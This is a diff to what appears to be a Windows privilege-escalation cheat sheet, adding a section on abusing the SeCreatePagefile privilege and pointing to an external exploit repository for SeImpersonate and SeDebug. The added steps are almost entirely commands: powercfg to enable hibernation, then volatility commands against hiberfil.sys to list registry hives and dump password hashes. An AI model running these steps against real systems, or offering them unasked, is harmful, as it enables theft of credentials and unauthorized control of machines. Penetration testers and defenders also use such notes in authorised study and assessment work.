@@ -159,3 +159,30 @@ Run the script to get system
 ### Alternate Method for SeImpersonate and SeDebug: 
 
 https://github.com/0xCyberY/Exploit-SeImpersonatePrivilege-and-SeDebugPrivilege
+
+## SeCreatePagefile
+
+This privilege allows a user to create and modify the paging file. Exploit this privilege by gaining access to sensitive information by creating or modifying the hibernation file to analyze offline.
+
+    hiberfil.sys
+
+### Steps:
+
+#### 1) Enable hibernation
+
+    powercfg /hibernate on
+    powercfg /hibernate /size 100 (Optional. Set hibernation file size if needed.)
+
+#### 2) After a reboot, the hiberfil.sys file will be created in the root of the system drive. Use volatility to analyze the hiberfil.sys file.
+
+Identify the profile and image type
+
+    volatility -f C:\hiberfil.sys imageinfo
+
+List registry hives
+
+    volatility -f C:\hiberfil.sys hivelist
+
+Dump hashes from the registry
+
+    volatility -f C:\hiberfil.sys hashdump
